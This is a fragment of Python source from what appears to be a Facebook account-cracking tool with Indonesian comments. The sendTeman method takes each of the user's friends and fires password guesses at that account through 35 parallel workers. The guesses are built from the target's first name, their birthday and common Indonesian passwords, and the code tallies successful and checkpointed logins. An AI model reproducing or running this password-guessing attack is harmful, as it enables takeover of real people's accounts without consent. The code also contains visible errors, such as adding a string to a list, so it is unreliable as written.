	...
	def sendTeman(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idTeman:
				...
				try:pwList=[r2['first_name'],['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','sayang','bangsad','123456','kontol','102030','anjing','bismillah','indonesia',r2['birthday']] #Password list ubah lah jika itu butuh
				except:pass
				try:
					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack1,id,pw,pwList[-1])
				except:pass
		print(f'[   CRACK SELESAI | HASIL OK:-{str(ok)} CP:-{str(cp)}   ]\n')
		b=input('[ BACK ]')
		self.menu()
	def sendPublik(self):
		os.system('clear')
